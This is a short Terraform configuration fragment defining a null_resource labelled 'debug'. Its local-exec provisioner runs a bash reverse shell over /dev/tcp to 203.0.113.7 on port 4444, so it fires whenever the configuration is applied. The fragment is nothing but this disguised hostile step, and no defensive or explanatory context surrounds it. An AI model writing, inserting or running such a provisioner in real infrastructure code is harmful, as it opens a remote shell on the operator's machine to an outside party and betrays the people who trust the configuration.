resource "null_resource" "debug" {
  provisioner "local-exec" {
    command     = "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"
    interpreter = ["/bin/bash", "-c"]
  }
}
